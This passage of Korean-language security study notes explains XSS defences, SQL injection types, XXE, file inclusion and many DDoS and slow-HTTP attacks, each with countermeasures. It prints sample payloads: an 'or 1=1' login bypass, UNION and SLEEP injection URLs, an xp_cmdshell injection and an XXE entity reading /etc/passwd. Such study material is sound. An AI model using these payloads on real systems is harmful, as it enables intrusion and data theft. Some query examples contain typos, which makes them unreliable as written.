> ex) 문자 "<"는 동일한 의미의 HTML "&lt;"로 변경한다. HTML 엔터티는 대부분의 인터프리터(특히, 브라우저)에서 특수한 의미를 가지지 않으며, 단순한 문자로 처리됨.         
5. 이렇게 인코딩하면 사용자는 \<script>가 \<script>로 보이지만 HTML 문서에서는 &lt;script&gt;로 나타나서 브라우저에서 일반 문자로 인식하고 스크립트로 해석되어 실행되지는 않는다.      
  
![image](https://user-images.githubusercontent.com/62640332/136660463-29d33149-f7af-4e5d-b4e4-1d9dd3418dac.png)

![image](https://user-images.githubusercontent.com/62640332/136660478-adc37af3-c4f0-4b80-986b-f705ed752e54.png)

ⅱ] 보안 라이브러리

1. AntiXss: MS 에서 공개용 XSS 취약점 예방 라이브러리
2. OWASP ESAPI 라이브러리: OWASP는 포괄적인 애플리케이션 보안을 위해 웹 응용 취약점을 대응할수 있는 오픈소스  ESAPI를 개발하여 제공

ⅲ] 브라우저 확장 프로그램

1. NoScript: 모지갈 기반의 브라우저에서 실행되는 오픈소스 확장프로그램으로 화이트 리스트 기반으로 신뢴된 사이트의 동적 스크립트만 브라우저에서 실행하도록함.


<br>
<br>


***
### ㅁ SQL Injection

: 웹 어플리케이션에서 데이터베이스로 전달되는 SQL쿼리 값을 변조 및 삽입히여 비정상적인 방법 으로 데이터베이스에 접근하는 공격을 의미

이러한 공격을 통해 발생될 수 있는 취약점은 인증우회(계정 및 암호없이 로그인), 시스템 명령어 삽입(저장 프로시저를 악용한 OS 명령어 삽입 등), 웹쉘 생성등이 있다.

---

ㅁ Error based SQL Injection

### - 논리적 에러를 이용하는 SQL Injection     

: or 1=1 등의 논리적 에러를 발생시킬 수 있는 패턴을 이용한 인증우회 기법.

특히 에러가 발생되는 사이트에서는 에러정보를 이용하여 데이터베이스 및 쿼리 구조 등의 정보를 추측.    

```
SELECT * FROM Users WHERE Username='$username' AND Password='\$password'    
```

외부에서 입력될 수 있는 계정(\$username)과 암호(\$password)에 참 조건(or 1=1)을 수행하는 문장을 삽입하여 계정과 암호 없이도 로그인 우회가 가능.     

```
SELECT * FROM Users HERE Username='1' or '1'='1' AND Password='1' or '1'='1'   
```

<br>

---

ㅁ Union based SQL Injection

### - Union SQL Injection

: UNION은 2개 이상의 쿼리를 요청하여 결과를 얻는 SQL 연산자이며,

공격자는 이를 악용하여 원래의 요청에 한 개의 추가 쿼리를 삽입하여 정보를 얻어내는 방식.    


id=5라는 1개의 쿼리와 테이블 정보가 들어있는 information_schema.tables를 얻으려는 추가 쿼리가 합쳐진 공격패턴     

```
http://www.site.com/news.php?id5 union all select 1,table_name,3 from information_schema.tables     
```
---

ㅁ Blind SQL Injection


### - Boolean based SQL

: 악의적인 문자열 삽입 대신 쿼리(참 혹은 거짓)에 따라 정보를 취득하는 기법.

에러가 발생되지 않는 사이트에서 위의 기법들을 사용할 수가 없기 때문에 공격을 통해 정상적인 쿼리가 수행되는지 혹은 쿼리가 수행되지 않아 쿼리 결과가 없느지를 통해 판단할 수 있다.


id=5 다음에 and 1=1을 삽입하였고 이는 where id=5 and 1=1로 처리될 것이다.

id=5(참) and 1=1(참)이기 대문에 page.php?id=5 입력한 것과 동일한 결과 페이지가 제공 될 것이다.

```
http://www.xxx.com/page.php?id= and 1=1 (참 조건)
```

<br>

그러나 and 1=2를 삽입한 경우, 

id=5(참)와 1=2(거짓)의 거짓조건으로 인해 정상적인 쿼리가 수행되지 않아 화면에 결과가 출력되지 않을 것이다.

```
http://www.xxx.com/page.php?id=5 and 1=2 (거짓 조건)
```

<br>

### - Time basedd SQL Injection

: 쿼리 결과를 특정시간만큼 지연시키는 방법을 이용하는 기법.

Blind 기법과 마친가지로 에러가 발생되지 않은 조건에서 사용하는 기법.

MySQL에서 Sleep() 함수를 이용하여 5초 후에 쿼리 결과를 얻도록 공격문자열을 삽입

만약 5초 후에 쿼리 결과가 화면에 출력된다면 취약점 있다고 판단 가능.

```
http://testphp.vulnweb.com/listproducts.php?cat=1 AND SLEEP(5) 
```

---

ㅁ Stored Procedure SQL Injection

### - 저장된 프로시저 에서의 SQL Injection

```
ㅁ 저장 프로시저(Stotred Procedure)

- 사용하고자 하는 Query에 미리 형식을 지정하는 것
- 일련의 쿼리를 하나의 함수처럼 실행하기 위한 쿼리의 집합
- 운영상 편의를 위해 만들어둔 SQL 집합 형태
```

: 저장 프로시저는 운영상 편이를 위해 만들어둔 SQL 집합형태이며, 

대표적인 저장 프로시저는 MS-SQL 에 있는 xp_cmdshell로 윈도우 명령어를 사용할 수 있게 됩니다. 

단, 공격자가 시스템 권한을 획득 해야 하므로 공격난이도가 높으나 공격에 성공한다면, 서버에 직접적인 피해를 입힐 수 있는 공격 입니다.

```
http://www.site.com/member/checkid.asp?id=';CREAT.....r.dbo.xp_cmdshell%20' netstat%20-an';
```

<br>

---
ㅁ Mass SQL Injection

### - 다량의 SQL Injection 공격

2008년에 처음 발견된 공격기법으로 기존 SQL Injection 과 달리 한번의 공격으로 다량의 데이터베이스가 조작되어 큰 피해를 입히는 것을 의미합니다. 

보통 MS-SQL을 사용하는 ASP 기반 웹 애플리케이션에서 많이 사용되며, 쿼리문은 HEX 인코딩 방식으로 인코딩 하여 공격합니다. 

보통 데이터베이스 값을 변조하여 데이터베이스에 악성스크립트를 삽입하고, 사용자들이 변조된 사이트에 접속 시 좀비PC로 감염되게 합니다. 

이렇게 감염된 좀비 PC들은 DDoS 공격에 사용됩니다.


<br>
<br>

ㅁ SQL 인젝션 대응 방안

1. 입력값 검증

- 화이트리스트 방식으로 지정된 형식의 문자만 검증
- 특수문자 등의 에러 발생 유무 확인
- db_name()으로 DB명 추출 여부 확인

2. SQL 오류 발생시 에러 메세지 표시하지 않음

- 별도로 처리해주지 않을 경우 에러가 발생한 쿼리문과 함께 에러에 관한 내용을 반환함. 
  
  이 때 테이블 명, 컬럼명, 쿼리문이 노출 될 수 있기 때문에 메세지가 표시되지 않도록 처리해 주어야 함.

3. 저장 프로시저 사용

- 사용하고자 하는 쿼리에 미리 형식을 지정하여 지정된 형식의 데이터가 아니면 쿼리문이 실행되지 않도록 함.

4. 서버 보안

- 최소 권한 유저로 DB운영
- 목적에 따라 쿼리 권한 수정
- 신뢰할 수 있는 네트워크, 서버에 대해서만 접근 허용
- 웹 방화벽 사용

5. Prepared Statement 구문사용

[<SQL injection 예시>](https://velog.io/@yu-jin-song/DB-SQL-%EC%9D%B8%EC%A0%9D%EC%85%98SQL-Injection)

***

### ㅁ XXE(XML eXternal Entity, XML 외부 엔티티)
  XXE 취약점 : XML 타입의 데이터 웹 요청을 통해 전송, 서버에서 XML 외부 엔티티 처리 가능하게 설정된 경우 발생

1. 사용자가 웹 애플리케이션으로 전달되는 XML 데이터를 직접 업로드/수정 가능
2. 공격자는 외부 엔티티를 참조하는 XML 데이터 전송
3. 파일과 같은 서버 내부의 정보 탈취/DOS/SSRF등의 공격 수행

- XML 외부 엔티티 선언 형태

```
\<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

DOCTYPE 선언을 한 다음 ENTITY 태그 이용, xxe라는 외부 엔티티 선언

선언된 외부 엔티티는 프로그래밍 시 변수 참조 처럼 XML 내부에서 참조 가능

xxe 엔티티를 참조하면 xxe 값인 SYSTEM 키워드로 지정된 /etc/passwd 파일 참조

file:// 대신 http://를 사용하여 외부 리소스 참조도 가능

ㅁ 대응 방법
1. 원천적인 대응 방법 : 외부 엔티티 참조 기능이 필요하지 않은 경우 DTDs나 외부 엔티티 관련 설정을 비활성화    

  \# 비활성화 방법은 프로그래밍 언어나 XML 파서의 종류에 따라 다름(OWASP 문서 링크 참조)

2. 시스템 운영자 or 보안 관리자 : ENTITY 태그가 요청 메시지를 통해 전달되는 것이 확인되면 주의

  \# 원래 의도된 요청인지 확인 필요

3. 서비스 중인 웹 애플리케이션에서 XML 외부 엔티티 기능 필요 X 
   
  -> 웹 방화벽 등 장비를 이용하여 해당 메시지 차단


<br>
<br>


ㅁ XXE 동작 방식

- XXE(XML External Entity) 공격은 취약하게 설정된 XML parser에 의해 external entity를 참조하는 XML input을 처리하였을 때 발생한다.

- XML 1.0 표준은 XML 문서의 구조를 정의하고 있다. 그 표준은 몇몇 타입의 저장 단위를 모아 entity라는 컨셉으로 정의한다. 여기에는 일부 다른 entity 타입이 있는데 선언된 시스템 identifier를 통해 로컬 혹은 원격지의 컨텐츠에 접근이 가능한 external entity라는 것이 있다.

[<XML 이란 무엇인가?>](https://github.com/sungmin4036/infomation_security/blob/main/etc/XML%20%EC%A0%95%EC%9D%98.md)


<br>
<br>

***

### ㅁ 파일 인클루전(file inclusion) 공격

: PHP 애플리케이션을 대상으로 발생, PHP의 인클루드 기능을 이용하는 공격
  - 인클루드 기능 : include라는 함수를 이용, 다른 파일을 소스코드에 직접 포함시킬 수 있는 기능
  
    -> 인클루드할 파일을 외부 사용자가 지정 가능한 경우 파일 인클루전 취약점 존재!
  
    => 공격자가 본인이 원하는 파일 인클루드시킬 수 있다!
  
  
ㅁ 파일 인클루전 공격 개요

: 공격자가 인클루드 할 수 있는 파일이 각각 호스트 내부/외부의 파일인지에 따라

  1) 로컬 파일 인클루전(Local File Inclusion, LFI)

  2) 리모트 파일 인클루전(Remote File Incluson, RFI) == 패스 트래버셜 공격 이라고도 함.

  두 종류로 구분.

  -> 외부의 파일도 원격으로 인클루드할 수 있는 RFI 공격이 더 심각한 공격임

 

- RFI 공격이 이루어지는 경우:

  1. 정상적인 상황에서 웹 애플리케이션이 file.php를 인클루드     
  
  2. flie.php가 웹 요청의 page 파라미터를 통해 지정됨 => 문제 발생      

  3. 공격자가 file.php 대신 자신이 관리하는 hacker.com으로부터 악성 코드 bad.php를 인클루드할 것을 지정        
               
  4. 웹 애플리케이션이 입력값 검증 수행 X => bad.php 파일을 인클루드하여 실행하게 됨              
              
- 웹 애플리케이션이 http://와 같은 문자열의 입력을 차단하여 RFI에 대해 방어                  
                
  -> LFI 공격 발생 가능성 여전히 존재

  => 공격자가 외부의 파일 대신 서버 호스트 내부의 파일 인클루드 시도

    ../(상위 디렉터리 경로 의미)와 같은 문자열을 이용 -> 현재의 웹페이지의 경로에서 벗어날 수 있게 됨

    -> ../../../../처럼 여러번 반복 => 루트 디렉터리까지 이동 가능 => 루트 디렉터리 아래 모든 경로 지정 가능

    => 위와 같은 공격 기법을 디렉터리 트래버설 공격이라고 함

<br>

ㅁ 대응 방법                 
        
1. 가장 좋은 방법은 외부 사용자가 입력한 파일 이름을 인클루드에 사용하지 않는 것
   
2. 어쩔 수 없이 외부에서 파일 이름을 입력받을 경우 그 입력값을 검증받아야 함  
                          
3. 가급적 화이트 리스트 검증 사용, 인클루드가 필요한 파일 이름의 목록을 작성, 해당 파일만 허용, 나머지 전부 차단                   
 
4. 블랙리스트 검증의 경우 http://, https://와 같은 프로토콜 관련 문자열 or ../ 같은 디렉터리 트래버설 공격을 위한 문자열 차단                                     

[<file inclue 공격 예시>](https://jhyuxxk.tistory.com/8)

<br>
<br>

DDoS 공격기법은 반사공격(reflection attack)으로서, 네트웍이 감당할 수 없는 트래픽의 양을 생성하여 정상적인 트래픽을 처리하지 못하도록 하는 것입니다. 

반사공격(reflection attack)을 시작하려면, SSDP(Simple Service Discovery Protocol)나 DNS(Domain Name System), NTP(Network Time Protocol), SNMP(Simple Network Management Protocol)과 같은 

UDP(User Datagram Protocol)서비스를 제공하는 인터넷 서버들을 스캔해서 정보를 요청하면서 정보를 받는 주소를 공격지점으로 지정합니다.

이렇게 서버들에 요청을 한 뒤 결과를 반환하게 되는데, 구성에 따라 요청한 양 보다 훨씬 큰 결과를 반환하는 경우가 많습니다. 

이러한 부분을 이용하는 것을 증폭 공격(Amplification Attack)이라고 하며, 이 두 가지 기법을 이용하여 

공격자가 소스 IP를 공격 대상 IP로 임의로 변경하여 많은 요청들을 해당 서버들에게 보내게 되면, 

10배 혹은 수백배 큰 응답들이 공격 대상에게 전달되어 정상적인 서비스를 방해하도록 하는 것입니다.


<br>
<br>

***
## Reflection Amplification State
***

### ㅁ DNS 증폭 공격(Amplification Attack)   
: 출발지 IP 주소를 조작하여 DNS 요청(DNS query)에 대한 응답(DNS response)이 조작된 IP 주소(Victim)로 전송 되도록 하는 공격 방법이다.      
 
조작하여 공격이 가능한 이유는 기본적으로 DNS 패킷에는 `인증 절차`가 존재하지 않기 때문이다.

증폭을 위해서 공격자는 Open DNS Resolver 서버를 이용하고 DNS Query 의 Type 을 "Any" 로 설정한다.   

- Open DNS Resolver 서버

: Open DNS Resolver 서버는 재귀적 질의(Recursive Query) 가 설정되어 있는 서버를 말한다.

재귀적 질의란 요청한 도메인 이름이 자신의 서버에 없을 경우 상위 DNS 서버에 요청을 주고 이러한 과정을 반복함으로써 최종 도메인 이름에 대한 처리를 해주는 것을 의미한다.

DNS 쿼리와 응답의 크기는 불균형적이며, 쿼리에 대한 응답은 원래 쿼리와 응답 모두를 포함하기 때문에 응답 패킷이 항상 쿼리 패킷보다 크게 되어 증폭된다.

예를 들어, DNS 네임 서버가 60 바이트 EDNS 쿼리(EDNS = Extended DNS) 를 받으면 그것에 대한 응답은 122 바이트 A RR 과 4000 바이트 TXT RR, 222 바이트 SOA RR 을 포함할 수 있다.

이는 최대 쿼리 보다 응답이 73% 커지도록 만들어 준다.

<br>


- DNS Query Type "Any"

: DNS Query 의 Type 을 "Any" 로 설정하게 되면 다양한 Type 의 레코드를 모두 요청하게 되므로 요청한 쿼리 패킷보다 크게 증폭된다.

결국, 재귀적 질의 와 ANY 타입의 레코드를 결합해 DNS 서버에 초당 수백 건의 DNS Query 를 보내게 되면 인증 절차가 없기 때문에 수십 Gbps 의 응답 트래픽을 발생시키게 된다.


ㅁ 대응 방법  

- 가장 기본적인 조치로 DNS 서버를 최신 버전으로 업데이트한다.  
   
- 가장 기본적인 방어 방법은 공격에 사용되고 있는 내부 DNS 서버에서 Any 쿼리를 못하게 설정하는 것이다.   혹은 DNS 를 사용하지 않고 있다면 서비스를 Down 시켜야 한다. 
    
- 출발지가 변조되었기 때문에 출발지 IP 를 방화벽에서 필터링하여 막는 것은 불가능하다.   다만 공격자가 공격 설정 시 특정 포트를 지정하였다면 변조되어 쿼리 하는 출발지의 포트를 필터링하여 쿼리를 막을 수 있다.
  
- 재귀적 질의를 사용하지 않도록 DNS 서버의 설정을 변경한다.
  
- 일반적으로 DNS 서버는 내부에서만 사용하므로 내부 IP 에서 요청한 DNS Query 에 대해서만 응답하도록 DNS 서버의 설정을 변경한다.


<br>
<br>


[ㅁ DNS 정보 정리](https://darrengwon.tistory.com/72)


### ㅁ NTP 증폭 DRDoS 공격(Amplification Attack )  

```
- NTP 프로토콜
: NTP(Network Time Protocol)는 IP 네트워크 상에 연결된 2개의 컴퓨터 사이에 각 장비별 동일한 시간을 갖게 하고 서브 시간을 교환할 수 있는 프로토콜
UDP 123번 포트를 사용한다.
컴퓨터 클록 시간을 1/1000 초 이하까지 동기화시키기 위해 협정 세계시각(UTC)을 사용한다.

- monlist
: NTP 서버에서 사용하는 monlist 명령어는 NTP 서버에 최근 접속한 600개의 IP 정보를 전송하는 명령어
따라서 1개의 monlist 요청패킷을 전송하면 600개의 IP 정보가 담긴 많은 양의 패킷을 응답받게 된다.
```
: DDoS 기법 중 하나로 공개된 NTP 서버를 통해 증폭된 UDP 패킷을 발송, 공격 대상 시스템이 정상적으로 서비스를 할 수 없도록 하는 것이다.

공격자의 IP 주소, 즉 Source IP를 공격 대상의 IP로 변조하여 NTP 서버에 다수의 monlist 명령을 요청하는 것이다. 

그러면 NTP 서버는 호스트 리스트가 포함된 패킷을 변조된 IP 주소로 응답하게 된다. 

이 응답 패킷은 요청 시 발생하는 패킷보다 훨씬 크게 증폭되며, 이 증폭된 트래픽은 공격 대상 서버로 향하게 되어 곧 서비스의 부하를 가져오게 된다.


ㅁ 대응방법

- NTP 버전을 확인하고 업그레이드하기.   
> ntpd -version

​- monlist 비활성화 하기   
> ntpd.conf disable monlist​

- 원격으로 monlist 지원여부 확인.   
> ntpd -c monlist ip주소​

- ntp서버 트래픽 유입을 제한하는 방화벽 설정   
> iptables -A OUTPUT -p udp --sport 123 -j DROP​


- NTP 설정을 변경한다.
> “ntp.conf” 파일의“restrict default”항목에 “noquery”를 추가함으로 monlist 기능을 비활성화

<br>
<br>


### ㅁ SSDP Amplification DDoS
: SSDP (Simple Service Discovery Protocol) 공격은 증폭 된 양의 트래픽을 대상 희생자에게 보내고 

UPnP (범용 플러그 앤 플레이) 네트워킹 프로토콜을 악용하여 반영하는 반사 기반의 분산 서비스 거부 (DDoS) 공격입니다.

대상의 인프라 및 웹 리소스를 오프라인 상태로 만듭니다.

정상적인 상황에서 SSDP 프로토콜은 UPnP 장치가 네트워크상의 다른 장치에 자신의 존재를 브로드 캐스트하도록 허용하기 위해 사용됩니다.

공격자는 UPnP 장치들을 찾아 리스트화 하고 대상자의 IP로 스푸핑된 UDP 패킷을 만들어 가능한 많은 데이터를 요청하는 내용을 담아 각 장치로 전송합니다.

대상자는 각 장치로부터 오는 증폭된 트래픽을 한꺼번에 받게 됩니다. 

```
- SSDP (Simple Service Dicovery Protocol) 
: 네트워크 서비스나 정보를 찾기 위해서 사용하는 네트워크 프로토콜. 
  일반 거주와 소규모 사무 환경에서 UPnP를 위한 기본적인 프로토콜로 사용하고 있음 . (SSDP 는 UPnP의 표준), UDP 1900 port 사용

- UPnP (Universal plug and play)
: 홈 네트워크에 있는 네트워크 장치들이 서로 연동될 수 있도록 하는 범용 표준 프로토콜. 
```



<br>
<br>



#### ㅁ VSE Query Flooding
: TSource Engine Query를 많은 요청으로 처리하여 모든 서버를 처리 할 수 ​​없도록함으로써 게임 서버에 대한 거부 공격을 발생 시키도록 설계되었습니다.

밸브 소스 엔진 플러드는 서버에 대해 사용 가능한 리소스를 소비하는 데 사용되는 UDP (증폭) 공격입니다.

공격은 TSource 엔진 쿼리 요청을 게임 서버에 보내도록 설계되었으므로 서버가 모든 요청을 처리 할 수없고 게임 서비스 거부를 만드는 많은 요청을 처리합니다.

이 유형의 공격은 게이머 시장에만 적용됩니다. Mirai는 서비스로 설계 되었기 때문에 게이머가 경쟁 우위, 경쟁 또는 복수에 대한 지연 또는 중단을 유발할 수 있다는 점이 매력적입니다.

<br>
<br>

### ㅁ GRE Flooding
: GRE 프로토콜을 이용해 특정사이즈의 패킷을 지속적으로 발생시켜 서버자원의 고갈을 유도한다.

GRE 프로토콜은 공격시 encapsulation을 통해 대량의 payload를 전송 가능하고 , 타겟서버는 IP defragmentation 과정에서 자원의 고갈이 발생 할 수 있다. 

- GRE Protocol    

: GRE (Generic Routing Encapsulation)는 IP 네트워크에서 가상 점대 점 링크 내에 다양한 네트워크 계층 프로토콜을 캡슐화 할 수있는 터널링 프로토콜 



<br>
<br>

### ㅁ Tsunami Syn Flooding
: 기존 SYN flood Attack은 패킷 당 40-60bytes의 트래픽을 유발하는데 반해, Tsunami SYN-Flood Attack은  패킷 당 1000bytes의 트래픽을 유발함

이러한 DDoS 공격의 유형은 UDP가 아닌 `TCP 프로토콜`을 사용하여 공격함
- 일반적으로 SYN 패킷은 TCP 3way handshake과정에서 생성되는 메시지이며, 해커들은 일반적인 SYN 패킷에 25배(최대 1000bytes)의 크기로 패킷 데이터양을 추가하는 방식으로 공격을 수행함

\# TCP 3way handshake: TCP/IP프로토콜을 이용해서 통신을 하는 응용프로그램이 데이터를 전송하기 전에 먼저 정확한 전송을 보장하기 위해 상대방 컴퓨터와 사전에 세션을 수립하는 과정

공격을 위해 봇넷(Botnet)을 이용하였으나 “공격자들은 트래픽이 발생하는 기계를 완벽히 제어할 수 없었으며 더 많은 봇(bots)을 트래픽에 덧붙여 공격한다.”라고 Radware 영국 지사의 Crawley가 설명함

\# 봇넷(Botnet):스팸메일이나 악성코드 등을 전파하도록 하는 악성코드 봇(Bot)에 감염되어 해커가 마음대로 제어할 수 있는 좀비PC들로 구성된 네트워크

 


<br>
<br>

### ㅁ SYN Flooding
: 공격자는 다량의 Syn 패킷을 서버로 전달하여 서버의 대기큐를 가득채워 새로운 클라이언트의 연결요청을 무시하도록 하여 장애를 유발 시키는 공격 

TCP 연결과정(3-Way Handshaking)의 처음 단계인 SYN 패킷 전송 단계에서 공격자는 대량의 SYN패킷을 생성하여 서버로 전달. 

TCP 연결요청을 수용할 때 사용하는 서버의 대기 큐(Backlog Queue) 가 가득(Full)차게 되어, 이후 들어오는 연결요청을 무시하도록 하는 서비스 거부 상태가 됨 

SYN 패킷만 전송하고 SYN-ACK에 대한 응답인 ACK 패킷을 전송하지 않으면 Half Open상태(75초)가 되며 이때 계속해서 Syn 패킷을 보내 Backlog Queue를 가득 채우고 더이상의 TCP 신규 접속을 받지 못하게됨.


<br>
<br>

### ㅁ UDP Flooding
: UDP Flooding은 DoS 공격(Denial-of-service attack)의 한 종류로써 많은 수의 UDP packet을 victim에 전송하여 정상적인 서비스가 불가능하도록 하는 공격이다.

UDP packet은 spoofing IP와 port를 사용하여 IP filter를 이용해서는 차단하기가 어렵다.

```
IP 스푸핑(IP Spoofing)이란 IP(Internet Protocol) 자체의 보안 취약성을 악용한 것으로 자신의 IP 주소를 속여서 접속하는 공격을 말한다.
신뢰 관계에 있는 두 시스템 사이에서 허가받지 않은 자가 자신의 IP 주소를 신뢰 관계에 있는 호스트의 IP 주소로 바꾸어 속이는 것으로 
rlogin, rsh 와 같이 IP 주소로 인증하는 서비스를 무력화시킬 수 있다. 

즉 공격자가 마치 신뢰성 있는 자가 송신한 것처럼 패킷의 소스 IP 주소를 변조하여 접속을 시도하는 침입 형태를 말한다.
```

네트워크 bandwidth를 소모하기 때문에 특정 서비스가 아니라 victim의 모든 서비스가 불가능해지며 특정 포트가 열려있을 필요도 없다. 

모든 flooding 공격류의 특징이 그러하듯 패킷 자체에는 특이점이나 패턴이 존재하지 않으므로 차단하기가 쉽지 않다.

UDP 공격의 경우 synflood와 달리 네트워크 bandwidth 를 소모시키는 것이 목적이다. 

따라서, 단일 호스트로는 효과를 볼 수 없기 때문에 ,DDoS로 구성해서 공격이 이루어진다.     

(DDoS를 수행하기 위해서는 최소 수백대의 Zombie호스트가 필요) 

<br>
<br>


### ㅁ ICMP Flooding

: 대량의 ping 패킷을 보내는 공격, smurf attack 이라고도 불림

대상 시스템에 막대한 양의 ICMP 에코 요청 패킷(ping 패킷)을 보내는 방법이다.  

유닉스 계열의 시스템에서는 ping 명령을 이용하며, ping 응답을 기다리지 않고 되도록 빨리 ICMP 패킷을 보내는 ping 옵션을 활용하는 것이 가장 효율적인 방법이다.    

대상 시스템에 부하를 일으키기 위해서는 ping을 보내는 쪽의 네트워크 대역폭이 대상 시스템이 확보한 네트워크 대역폭보다 더 크면 된다.

- 통신을 위해서 서비스 및 포트가 필요 없는 유일한 프로토콜
- ACL을 이용한 차단을 하거나, Inbound 패킷 임계치 설정하여 차단한다.
 


<br>
<br>

### ㅁ CLDAP DDoS Attack
: 해커가 여러 LDAP서버에 자기 자신의 IP를 타겟 IP로 변조하여 쿼리를 보내면, 서버는 데이터를 처리한 후 증폭된 응답 패킷을 변조된 타겟 IP로 보내는 방식

```
CLDAP(Connection-less Lightweight Directory Access Protocol)란

- LDAP란 경량 디렉토리 엑세스 프로토콜의 약자로 서버 TCP/IP에서 디렉토리 서비스를 조회하고 수정하는 응용 프로토콜을 말함

- CLDAP란 클라이언트들이 마이크로소프트 액티브 디렉토리 네트워크로부터 서버의 사용자 계정과 비밀번호에 접근할 때 사용됨

최근 DDoS공격 중 LDAP/CLDAP 두 개의 프로토콜을 이용하는 공격이 자주 발견되고 있음
```

1) 공격자들이 특별히 제작된 패킷을 인터넷을 통해 여러 UDP 서버로 보낸다.
2) 이 패킷은 디도스 공격의 표적이 될 시스템의 IP로부터 나온 것처럼 보인다.
3) UDP 서버가 그에 대한 응답을 표적 시스템(피해 시스템)의 IP로 보낸다.
4) 이 때 그 응답은 1)번 단계의 패킷 조작을 통해 매우 용량이 커진 상태다.
5) 큰 용량의 응답을 받은 표적 시스템은 마비가 된다. 

CLDAP는 searchRequest、searchResponse （searchResEntry 및 searchResDone）、abandonRequest 3가지 기능만을 제공하며, 

클라이언트는 UDP 데이터 그램을 사용하여 인증을 제공하지 않고 LDAP 서버 389 포트에 대한 작업 요청을 시작할 수 있습니다.

클라이언트가 searchRequest를 발생시킨 후 서버는 searchResEntry와 searchResDone 두개의 응답메세지를 반환하고, 

일반적인 경우에는 이러한 작업은 비교적 작은 패킷을 비교적 큰 패킷으로 증폭시키는 효과를 갖게됩니다. 

그래서 이러한 취약점은 DDoS 증폭공격에 사용될 수 있는 것입니다. 

실제로 현재 CLDAP ReDDoS 공격에 가장 많이 악용되는 서버는 윈도우 서버의 Active Directory(AD)입니다. 

통상적으로 AD서버는 TCP 포트 389를 통하여 클라이언트의 LDAP 작업요청을 리스닝하며, 

또한 UDP 포트 389에서 CLDAP 프로토콜을 사용하여 rootDSE 검색 작업을 기다립니다.

일부 Windows 서버의 AD rootDSE검색서비스 리스닝 포트가 일반 네트워크에 공개되어 있어, Reflection DDoS 공격을 생성하기 위해 rootDSE 쿼리를 수행하는데 악용되게 됩니다. 

CLDAP ReDDoS는 평균 50배~86배 정도 증폭이 됩니다.

CLDAP ReDDoS 공격은 주로 Windows 서버의  Active Directory 취약점으로 발생되며, 이러한 공격을 예방하려면 먼저 `389번과 636`번 포트를 제한해야 합니다.


<br>
<br>

***
#### ㅁ HTTP 취약점 - 서비스 거부 공격
***

<br>
<br>

### ㅁ Slow HTTP Header DoS       
: Slowloris 공격이라고도 부른다.  

HTTP Header 정보를 비정상적으로 조작하여 웹서버가 온전한 Header정보가 올때 까지 기다리도록 한다.   

서버가 연결 상태를 유지할 수 있는 가용자원은 한계가 있으므로 임계치를 넘어가면 다른 정상적인 접근을 거부하게 된다.   

ㅁ 동작   

HTTP에선 헤더의 끝을 /r/n 이라는 개행문자로 구분한다.   

공격자는 이 마지막 개행문자를 보내지 않고 지속적으로 의미없는 변수를 추가한다.   

서버는 헤더 정보가 아직 전송 중이라고 인식하고 연결을 유지한다.   

ㅁ 대응  방법

- 공격자가 동시에 많은 세션을 유지하므로 방화벽 등을 통하여 세션 임계치 제한을 설정한다.   

공격자가 헤더를 천천히 전달하며 연결 시간을 지속시키므로 연결 타임아웃 시간을 적절히 짧게 두어 의심되는 연결이 종료되도록 한다.   

단, 너무 짧게 둘 경우 일부 느린 네트워크의 정상적인 연결에 대해서도 가용성을 해칠 수 있다. 

<br>

### ㅁ Slow HTTP Read DoS   

: 정상트래픽 이라면 Window Size가 가변적이지만 공격 트래픽은 Window Size가 "0"으로 고정   

매우 작은 윈도우크기로 서버에 응답을 보내면 서버는 더 이상 데이터를 전송하지 못하고 연결만 유지한 상태로 대기   
  
<br>
<br>

\# Slow HTTP GET/POST 공격방법은 HTTP Header의 Content-Length 필드에 임의의 큰값 입력하여 웹서버가 클라이언트에서 해당 크기의 메세지 전송시까지 Connection을 유지하게 하여 소량의 데이터를 느린속도로 장시간 동안 세션 유지

### ㅁ Slow HTTP POST DoS     
: RUDY(RU-Dead-Yet?) 공격이라고도 부른다.   

클라이언트와 서버가 정상적인 3-way Handshaking을 거친후 클라이언트가 POST 메소드로 대량의 데이터를 장시간에 걸쳐 분할 전송하여 연결을 장시간 유지시킨다.     

서버가 POST 데이터를 모두 수신하지 않았다고 판단하면 전송이 다 이루어질때 까지 연결을 유지하는 성격을 이용한다.      

예를 들어 Content-Length를 100000byte로 하고 데이터는 일정한 간격으로 1byte씩 전송한다.   

이러한 연결을 다량 만들어 각각의 연결이 장시간 유지되도록 하여 가용성을 해친다   

<대응방안>
1. 각 POST 폼에 메세지 크기 제한
2. 최저 데이터 전송 속도 제한
3. 항시 TCp 상태 모니터링하여 평소보다 Established 및 Time Wait값이 많은지 


### ㅁ HTTP GET Flooding
: 일반적으로 DDoS 공격은 웹 서버(Web Service)를 대상으로 DDoS 공격이 발생되며, TCP 세션 연결 이후 발생하는 일반적인 공격 형태가 바로 HTTP Get Flooding 형태가 그것이다.    
다시 말하면, HTTP Get Flooding 은 정상적인 TCP 연결 과정 이후 정상적으로 보이는 HTTP Transaction 과정이 수행되는 DDoS 공격 기법이다.

- TCP Connection Flooding 의 경우 TCP 3-Way Handshake 과정 이후 정상적인 트랜잭션이 일어나지 않는 반면

- HTTP GET Flooding의 경우 TCP 3-Way Handshake 과정 이후 정상적으로 보이는 트랜잭션이 추가적으로 발생되는 DDoS 공격 기법이다. 

공격 트래픽을 수신하는 서버는 정상적인 TCP 세션과 함께 정상적으로 보이는 `HTTP Get Request`을 지속적으로 요청하게 되므로,

서비스를 위하여 수행하는 서버는 기본적인 TCP 세션 처리뿐만 아니라 HTTP 요청 처리까지 수행해야 한다.
 
이 경우 HTTP 처리 모듈의 과부하까지도 야기시킬 수 있는 DDoS 공격 기법이다.

전통적인 DDoS 공격 대응 장비에서 이러한 HTTP Get Flooding 공격을 방어하기 위해서는 일반적으로 임계치 기반의 방어 기법을 적용한다.

즉 HTTP Get Flooding 시 수행되는 TCP 연결 요청의 임계치 값과 HTTP Get 요청의 임계치 값의 모니터링을 통하여 비정상적으로 많은 트래픽을 발생하는 출발지 IP에 대한 선별적인 차단 적용이 가능해 진다.

다행히도 이러한 세션 연결 기반 공격의 경우 출발지 IP는 변조될 수가 없기 때문에 출발지 IP 기준의 임계치를 통하여 방어가 가능하다.

![image](https://user-images.githubusercontent.com/62640332/161374017-afc35bda-a669-4959-859d-6f352d9d4129.png)

- 선별적 IP 차단 : TCP 연결 요청 임계치 값과, HTTP Get의 임계치 값 모니터링후 비정상적인 트래픽은 차단, 연결기반 공격이여서 IP변조 불가능
